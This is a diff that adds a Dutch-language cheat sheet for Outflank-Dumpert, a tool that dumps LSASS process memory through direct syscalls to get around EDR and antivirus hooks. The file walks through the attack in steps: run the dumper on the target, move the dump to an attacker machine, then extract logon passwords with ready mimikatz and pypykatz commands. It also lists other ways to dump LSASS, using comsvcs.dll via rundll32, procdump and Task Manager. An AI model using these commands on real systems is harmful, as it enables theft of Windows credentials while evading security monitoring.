@@ -1,0 +1,43 @@
+# Outflank-Dumpert — Direct syscall LSASS dumper
+# Dumpt LSASS geheugen via direct syscalls, omzeilt API hooks van EDR/AV
+#
+# === Syntax ===
+# Outflank-Dumpert.exe
+#
+# === Werking ===
+# Gebruikt directe syscalls (ntdll.dll) i.p.v. standaard Win32 API calls.
+# Dit omzeilt userland hooks die EDR producten plaatsen op API functies
+# zoals NtReadVirtualMemory en MiniDumpWriteDump.
+# De LSASS dump wordt weggeschreven naar %TEMP%\dumpert.dmp
+#
+# === Gebruik ===
+
+# Stap 1: LSASS dump maken op het doelsysteem
+Outflank-Dumpert.exe
+
+# Output: dumpert.dmp in %TEMP% directory
+
+# Stap 2: Dump exfiltreren naar attacker machine
+# Kopieer %TEMP%\dumpert.dmp naar je aanvalsmachine
+
+# Stap 3: Offline parseren met mimikatz
+mimikatz.exe "sekurlsa::minidump dumpert.dmp" "sekurlsa::logonpasswords" "exit"
+
+# Pypykatz variant (Python, op Linux)
+pypykatz lsa minidump dumpert.dmp
+
+# === Alternatieve dump methoden ===
+
+# Handmatige dump via Task Manager:
+# Task Manager > Details > lsass.exe > Create dump file
+
+# Via comsvcs.dll (Living off the Land)
+# rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [LSASS_PID] dump.dmp full
+
+# Via procdump (SysInternals)
+# procdump.exe -accepteula -ma lsass.exe dump.dmp
+
+# NOTE: Vereist admin/SYSTEM rechten
+# NOTE: Dump locatie: %TEMP%\dumpert.dmp
+# NOTE: Omzeilt userland API hooks maar niet kernel-level bescherming
+# NOTE: Credential Guard/PPL kan LSASS dump nog steeds blokkeren
